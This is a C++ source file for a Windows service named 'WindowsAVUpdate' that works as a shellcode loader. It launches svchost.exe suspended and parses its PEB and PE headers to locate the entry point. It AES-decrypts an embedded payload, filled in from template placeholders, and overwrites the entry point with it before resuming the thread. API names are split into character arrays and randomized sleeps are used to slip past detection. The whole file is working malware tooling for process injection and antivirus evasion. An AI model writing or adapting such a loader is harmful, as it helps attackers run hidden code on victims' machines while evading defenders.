#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <strsafe.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <time.h>
using namespace std;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength / 2), length_is(Length / 2)]
#endif // MIDL_PASS
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING;

typedef LSA_UNICODE_STRING UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	ULONG                   MaximumLength;
	ULONG                   Length;
	ULONG                   Flags;
	ULONG                   DebugFlags;
	PVOID                   ConsoleHandle;
	ULONG                   ConsoleFlags;
	HANDLE                  StdInputHandle;
	HANDLE                  StdOutputHandle;
	HANDLE                  StdErrorHandle;
	UNICODE_STRING          CurrentDirectoryPath;
	HANDLE                  CurrentDirectoryHandle;
	UNICODE_STRING          DllPath;
	UNICODE_STRING          ImagePathName;
	UNICODE_STRING          CommandLine;
	PVOID                   Environment;
	ULONG                   StartingPositionLeft;
	ULONG                   StartingPositionTop;
	ULONG                   Width;
	ULONG                   Height;
	ULONG                   CharWidth;
	ULONG                   CharHeight;
	ULONG                   ConsoleTextAttributes;
	ULONG                   WindowFlags;
	ULONG                   ShowWindowFlags;
	UNICODE_STRING          WindowTitle;
	UNICODE_STRING          DesktopName;
	UNICODE_STRING          ShellInfo;
	UNICODE_STRING          RuntimeData;
	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef void (*PPEBLOCKROUTINE)( PVOID PebLock );

typedef struct _PEB_FREE_BLOCK {
	_PEB_FREE_BLOCK* Next;
	ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	int BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

// WINAPI function pointers
// function pointer types
typedef NTSTATUS (WINAPI* pZwQueryInformationProcess)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pGetModuleHandle)(LPCSTR lpModuleName);
typedef BOOL(WINAPI* pCreateProcessA)( LPCSTR lpApplicationName, 
	                                   LPCSTR lpCommandLine,
									   LPSECURITY_ATTRIBUTES lpProcessAttributes,
									   LPSECURITY_ATTRIBUTES lpThreadAttributes,
	                                   BOOL bInheritHandles, 
	                                   DWORD dwCreationFlags,
									   LPVOID lpEnvironment,
									   LPCSTR lpCurrentDirectory,
	                                   LPSTARTUPINFOA lpStartupInfo, 
	                                   LPPROCESS_INFORMATION lpProcessInformation);
typedef HMODULE(WINAPI* pLoadLibrary)(LPCSTR lpLibFileName);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize,  SIZE_T* lpNumberOfBytesRead);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef DWORD(WINAPI* pResumeThread)(HANDLE hThread);

BYTE payload_key[] = { <<<PAYLOADKEY>>> };
BYTE payload[] = { <<<PAYLOAD>>> };

unsigned char svchost_str[] = { 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e', 0x0 };
unsigned char zwQueryInformationProcess_str[] = { 'Z','w','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s', 0x0};
unsigned char kernel32_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char ntdll_str[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char getprocaddress_str[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 }; 
unsigned char getmodulehandleA_str[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0};
unsigned char createProcessA_str[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0x0};
unsigned char loadlibrary_str[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0};
unsigned char readProcessMemory_str[] = { 'R','e','a','d','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0};
unsigned char writeProcessMemory_str[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0};
unsigned char resumeThread_str[] = { 'R','e','s','u','m','e','T','h','r','e','a','d',0x0};


SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler (DWORD);
DWORD WINAPI ServiceWorkerThread (LPVOID lpParam);

#define SERVICE_NAME  (LPSTR)"WindowsAVUpdate"

int main (int argc, TCHAR *argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] = 
    {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher (ServiceTable) == FALSE)
    {
       return GetLastError ();
    }

    return 0;
}

VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv)
{
    DWORD Status = E_FAIL;

    g_StatusHandle = RegisterServiceCtrlHandler (SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL) 
    {
        //goto EXIT;
    }

    // Tell the service controller we are starting
    ZeroMemory (&g_ServiceStatus, sizeof (g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    

    /* 
     * Perform tasks neccesary to start the service here
     */
    
    // Create stop event to wait on later.
    g_ServiceStopEvent = CreateEvent (NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) 
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
	    
        //goto EXIT; 
    }    

    // Tell the service controller we are started
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus); 
    
    // Start the thread that will perform the main task of the service
    HANDLE hThread = CreateThread (NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    // Wait until our worker thread exits effectively signaling that the service needs to stop
    WaitForSingleObject (hThread, INFINITE);
    
    CloseHandle (g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    {

    }
    
    //EXIT:
    //OutputDebugString(_T("My Sample Service: ServiceMain: Exit"));

    return;
}

VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)
{
    switch (CtrlCode) 
	{
     case SERVICE_CONTROL_STOP :

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
           break;

        /* 
         * Perform tasks neccesary to stop the service here 
         */
        
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
		
        // This will signal the worker thread to start shutting down
        SetEvent (g_ServiceStopEvent);

        break;

     default:
         break;
    }

}

VOID AESDecrypt(BYTE* payload, DWORD payload_len, BYTE* key, size_t keylen)
{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}

DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
{
    LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION bi;

	int sleep_time = 0;

	// get the memory address of the GetProcAddress function
	pGetProcAddress cGetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getprocaddress_str);

	// get the memory address of the GetModuleHandle function
	pGetModuleHandle cGetModuleHandle = (pGetModuleHandle) cGetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getmodulehandleA_str);

	// get the memory address of the CreateProcessA function
	pCreateProcessA cCreateProcessA = (pCreateProcessA) cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)createProcessA_str);

	cCreateProcessA(0, (LPSTR)svchost_str, 0, 0, 0, 0x4, 0, 0, si, pi);

	sleep_time = rand() % 1000 + 30000;
    Sleep(sleep_time);

	// load ntdll.dll and set function pointer for ZwQueryInformationProcess
	pLoadLibrary cLoadLibrary = (pLoadLibrary)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)loadlibrary_str);
	
	pZwQueryInformationProcess cZwQueryInformationProcess = (pZwQueryInformationProcess)cGetProcAddress(cLoadLibrary((LPCSTR)ntdll_str), (LPCSTR)zwQueryInformationProcess_str);

	cZwQueryInformationProcess(pi->hProcess, 0, &bi, (UINT)(sizeof(INT_PTR) * 6), 0);

	sleep_time = rand() % 1000 + 30000;
    Sleep(sleep_time);

	LPCVOID ptrToImageBase = (LPCVOID)((INT64)bi.PebBaseAddress + 0x10);

	// create 8 byte array
	BYTE addrBuff[sizeof(INT_PTR)];

	// get the memory address of the ReadProcessMemory function
	pReadProcessMemory cReadProcessMemory = (pReadProcessMemory)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)readProcessMemory_str);

	// read in 8 bytes of memory at PebBaseAddress + 0x10 to grab address of image base
	cReadProcessMemory(pi->hProcess, ptrToImageBase, addrBuff, sizeof(addrBuff), 0);

	sleep_time = rand() % 1000 + 30000;
    Sleep(sleep_time);

	// create an 8byte buffer
	LPCVOID  * svchostBase = (LPCVOID *)((INT64)addrBuff);
	
	// create a 200 byte of NOPs to store data read
	BYTE data[400];
	for (int i = 0; i < sizeof(data); i++) { data[i] = 0x00; }

	// read in 200 bytes of memory at address of image base (\x4d\x5a\x90..MZ..)
	cReadProcessMemory(pi->hProcess, *svchostBase, data, sizeof(data), 0);

	// grab the offset address value from the start of the image copy + 0x3c
	LPCVOID * offsetAddr = (LPCVOID * )((INT64)data + 0x3C);
	
	// grab the first byte value at the offset address
	BYTE e_lfanew_offset = (BYTE)*offsetAddr;
	
	// Calculate the offset to entry point
	INT64 opthdr = (INT64) e_lfanew_offset + 0x28;

	// Calculate the address of the ERV
	LPCVOID * rva_offset_addr = (LPCVOID*)((INT64)data + opthdr);
	
	// grab the value of the rva offset
	INT32 rva_offset_value = (INT32)*rva_offset_addr;
	
	// calculate final address of entry point - svchostBase to rva_offset_value
	INT64 addressofEntryPoint = (INT64)*svchostBase + (INT64)rva_offset_value;
	
	// decrypt the payload
	AESDecrypt((LPBYTE)payload, (size_t)sizeof(payload), payload_key, (size_t)sizeof(payload_key));

	// get the memory address of the WriteProcessMemory function
	pWriteProcessMemory cWriteProcessMemory = (pWriteProcessMemory)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)writeProcessMemory_str);

	// write the decrypted payload to the entry point of process
	cWriteProcessMemory(pi->hProcess, (LPVOID)addressofEntryPoint, payload, sizeof(payload), 0);

    sleep_time = rand() % 1000 + 30000;
    Sleep(sleep_time);

	// get the memory address of the ResumeThread function
	pResumeThread cResumeThread = (pResumeThread)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)resumeThread_str);

	// restart thread and execute shellcode
	cResumeThread(pi->hThread);

    return ERROR_SUCCESS;
}